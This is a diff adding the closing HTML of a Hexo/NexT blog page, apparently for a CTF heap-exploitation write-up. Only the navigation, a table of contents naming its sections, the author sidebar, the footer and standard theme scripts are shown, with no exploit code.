+              <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/01/10/blog%20configuration%20&%20beautify/" rel="prev" title="Hexo & Next 博客配置与美化">
+      <i class="fa fa-chevron-left"></i> Hexo & Next 博客配置与美化
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/08/26/2023%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BPwn-takeway-wp/" rel="next" title="2023第七届蓝帽杯初赛Pwn-takeway-wp">
+      2023第七届蓝帽杯初赛Pwn-takeway-wp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#x01-buuctf-babyheap_0ctf_2017"><span class="nav-number">1.</span> <span class="nav-text">0x01 BUUCTF
+babyheap_0ctf_2017</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#x00-%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 写在前面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.2.</span> <span class="nav-text">Ⅱ. 解题步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="nav-number">1.3.</span> <span class="nav-text">Ⅲ. 完整EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E7%96%91%E9%97%AE"><span class="nav-number">1.4.</span> <span class="nav-text">Ⅳ. 一些疑问</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Gap"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Gap</p>
+  <div class="site-description" itemprop="description">An undergraduate student of Cybersecurity at SDU.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="sidebar-button motion-element"><i class="fa fa-comment"></i>
+    Chat
+  </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/HeyGap" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;HeyGap" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/2310769056@qq.com" title="E-Mail → 2310769056@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Gap</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
